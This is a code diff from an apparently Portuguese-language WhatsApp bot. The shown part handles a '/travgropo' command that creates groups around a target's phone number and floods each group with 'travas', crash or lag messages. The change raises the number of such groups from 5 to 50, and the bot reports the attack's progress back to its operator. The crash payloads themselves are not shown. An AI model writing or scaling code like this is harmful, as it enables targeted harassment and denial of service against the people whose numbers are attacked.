@@ -409,12 +409,12 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 const nomeGrupo = "𝑹𝑬𝑷𝑶́𝑹𝑻𝑬𝑹 𝒃𝒚 𝑳𝑶𝑻𝑼𝑿";
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
 
-                for (let g = 1; g <= 5; g++) {
+                for (let g = 1; g <= 50; g++) {
                     try {
                         const grupoCriado = await waSock.groupCreate(`${nomeGrupo} #${g}`, [jidAlvo]);
                         const idNovoGrupo = grupoCriado.id;
 
-                        await waSock.sendMessage(remoteJid, { text: `✅ Grupo ${g}/5 criado. Disparando travas...` });
+                        await waSock.sendMessage(remoteJid, { text: `✅ Grupo ${g}/50 criado. Disparando travas...` });
                         await delay(2000);
 
                         for (let i = 1; i <= quantidadeTrava; i++) {
@@ -426,7 +426,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 }
 
-                await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada com sucesso nos 5 grupos!` });
+                await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada com sucesso nos 50 grupos!` });
             }
             else if (texto.startsWith('/kick ')) {
                 if (!remoteJid.endsWith('@g.us')) {
